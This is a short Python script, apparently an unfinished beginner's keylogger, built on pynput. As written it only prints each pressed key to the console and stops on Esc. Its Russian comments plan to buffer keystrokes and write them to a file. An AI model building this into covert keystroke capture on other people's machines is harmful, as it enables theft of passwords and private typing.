import pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener

class Keylogger:
    def __init__(self):
        self.count = 0 # подсчет символов, если > 10, то запись в файл
        self.keys = [] # для убодной работы

    # вывод нажатых клавиш
    def on_press(self, key):
        print(f"{key} pressed")

    def on_release(self, key):
        # если зажата клавиша esc - выход из программы
        if key == Key.esc:
            return False


if __name__ == "__main__":
    obj = Keylogger()
    with Listener(on_press = obj.on_press, on_release = obj.on_release) as listener:
        listener.join()